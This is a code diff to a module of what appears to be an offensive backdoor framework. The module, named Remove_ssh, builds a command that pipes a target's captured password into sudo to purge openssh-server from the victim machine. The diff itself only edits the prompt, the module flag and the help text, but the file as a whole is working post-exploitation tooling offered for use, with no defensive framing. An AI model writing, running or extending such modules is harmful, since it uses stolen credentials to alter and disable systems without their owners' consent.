@@ -1,7 +1,7 @@
 from backdoor import *
 
 class Remove_ssh(Backdoor):
-    prompt = Fore.RED + "remove_ssh" + Fore.BLUE + ">> " + Fore.RESET
+    prompt = Fore.RED + "(remove_ssh)" + Fore.BLUE + ">> " + Fore.RESET
 
     def __init__(self, core):
 	cmd.Cmd.__init__(self)
@@ -9,9 +9,9 @@ class Remove_ssh(Backdoor):
         self.core = core
         self.options = { #~Input extra options. You almost always need a port.~
                 }
-        self.allow_modules = True
+        self.allow_modules = False
         self.modules = {}
-        self.help_text = ""
+        self.help_text = "Removes ssh on the target."
 
     def get_command(self):
 	return str("echo " + self.core.curtarget.pword + " | sudo -S apt-get -y purge openssh-server")
